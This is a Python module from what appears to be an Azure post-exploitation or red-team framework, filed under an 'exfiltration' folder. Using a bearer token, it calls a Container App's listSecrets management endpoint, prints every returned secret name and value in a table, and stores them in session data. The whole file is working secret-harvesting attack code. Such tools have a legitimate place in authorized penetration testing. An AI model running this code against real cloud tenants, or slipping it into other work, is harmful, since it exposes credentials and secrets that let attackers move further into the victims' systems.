# src/clouds/azure/modules/exfiltration/exfiltrate_container_app_secrets.py

import requests
from rich.console import Console
from rich.table import Table
from rich.prompt import Prompt

from ...azure_session import AzureSessionManager

console = Console()


def exfiltrate_container_app_secrets(session_mgr: AzureSessionManager, container_app_id: str = None) -> dict:
    """
    Extract secrets from an Azure Container App using the listSecrets endpoint.

    Uses Azure Management REST API directly with POST to /listSecrets.

    Args:
        session_mgr: Azure session manager
        container_app_id: Full Container App resource ID (prompts if not provided)

    Returns:
        Dictionary with secrets data
    """

    # Get subscription ID
    subscription_id = session_mgr.current_session_data.get("subscription_id")
    if not subscription_id:
        console.print("[red]No subscription configured. Use a login command first.[/red]")
        return {}

    # Get Container App ID
    if not container_app_id:
        container_app_id = Prompt.ask(
            "[cyan]Container App resource ID[/cyan]\n"
            "[dim]Example: /subscriptions/{sub-id}/resourceGroups/{rg}/providers/Microsoft.App/containerApps/{name}[/dim]"
        ).strip()

    if not container_app_id:
        console.print("[red]Container App resource ID is required.[/red]")
        return {}

    console.print(f"[cyan]Extracting secrets from Container App:[/cyan]\n[dim]{container_app_id}[/dim]")

    # Get management token
    token = session_mgr.get_access_token(scope="management")
    if not token:
        console.print("[red]Management authentication required. Use a login command first.[/red]")
        return {}

    # Call listSecrets endpoint (POST)
    url = f"https://management.azure.com{container_app_id}/listSecrets?api-version=2023-05-01"

    headers = {
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json"
    }

    try:
        console.print("[dim]Calling listSecrets endpoint...[/dim]")
        response = requests.post(url, headers=headers, json={}, timeout=30)
        response.raise_for_status()

        secrets_data = response.json()

    except requests.exceptions.RequestException as e:
        console.print(f"[red]Error calling Azure API: {e}[/red]")
        if hasattr(e, 'response') and e.response is not None:
            console.print(f"[dim]Response: {e.response.text[:500]}[/dim]")
        return {}
    except Exception as e:
        console.print(f"[red]Error: {e}[/red]")
        return {}

    if not secrets_data:
        console.print("[yellow]No secrets data returned.[/yellow]")
        return {}

    console.print(f"[green]Successfully retrieved secrets data.[/green]")

    # Extract Container App name from ID
    app_name = container_app_id.split("/")[-1] if "/" in container_app_id else "unknown"

    # Save exfiltration data
    session_mgr.save_enumeration_data(f"container_app_secrets_{app_name}", secrets_data)

    # Display results
    console.print("\n[bold cyan]Container App Secrets:[/bold cyan]\n")
    console.print(secrets_data)
    console.print()

    # Try to display in a table format if possible
    if "value" in secrets_data:
        table = Table(title=f"Secrets for {app_name}")
        table.add_column("Secret Name", style="cyan")
        table.add_column("Value", style="yellow", overflow="fold")

        for secret in secrets_data.get("value", []):
            name = secret.get("name", "N/A")
            value = secret.get("value", "N/A")
            table.add_row(name, value)

        console.print(table)

    console.print(f"[dim]Saved as 'container_app_secrets_{app_name}' in this session's enumeration data.[/dim]")

    return secrets_data
